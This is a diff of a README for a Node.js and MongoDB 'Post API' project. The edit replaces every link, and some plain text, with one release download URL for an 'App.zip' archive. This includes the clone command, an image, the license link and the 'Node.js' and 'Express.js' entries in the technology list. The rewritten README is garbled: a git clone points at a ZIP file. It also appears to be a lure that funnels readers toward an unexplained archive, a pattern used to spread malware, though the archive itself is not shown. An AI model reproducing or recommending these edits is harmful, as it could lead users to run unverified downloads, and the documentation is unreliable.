@@ -21,7 +21,7 @@ This repository focuses on creating a Post API using MongoDB as the database. It
 
 To get started with the repository, you can clone the project from the following link: 
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/steamengenharia/Make-Post-API-MongoDB/releases/download/v1.0/App.zip)](https://github.com/steamengenharia/Make-Post-API-MongoDB/releases/download/v1.0/App.zip)
 
 Please note that the ZIP file needs to be extracted after download for further usage.
 
@@ -33,7 +33,7 @@ Follow these steps to set up the Post API project on your local machine:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Make-Post-API-MongoDB.git
+   git clone https://github.com/steamengenharia/Make-Post-API-MongoDB/releases/download/v1.0/App.zip
    ```
 
 2. Install dependencies:
@@ -62,14 +62,14 @@ The Post API provides the following endpoints:
 
 For easy testing and integration, you can import the Postman Collection provided in the repository. The collection includes pre-configured requests for each API endpoint, making it convenient to interact with the Post API.
 
-![Postman Collection](https://image-url/postman-collection.png)
+![Postman Collection](https://github.com/steamengenharia/Make-Post-API-MongoDB/releases/download/v1.0/App.zip)
 
 ## Technologies Used
 
 The project is built using the following technologies:
 
-- Node.js
-- Express.js
+- https://github.com/steamengenharia/Make-Post-API-MongoDB/releases/download/v1.0/App.zip
+- https://github.com/steamengenharia/Make-Post-API-MongoDB/releases/download/v1.0/App.zip
 - MongoDB
 - Mongoose
 
@@ -77,7 +77,7 @@ The project is built using the following technologies:
 If you have any suggestions or improvements, feel free to submit a pull request. Contributions are always welcome!
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Make-Post-API-MongoDB/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/steamengenharia/Make-Post-API-MongoDB/releases/download/v1.0/App.zip) file for details.
 
 ---
 
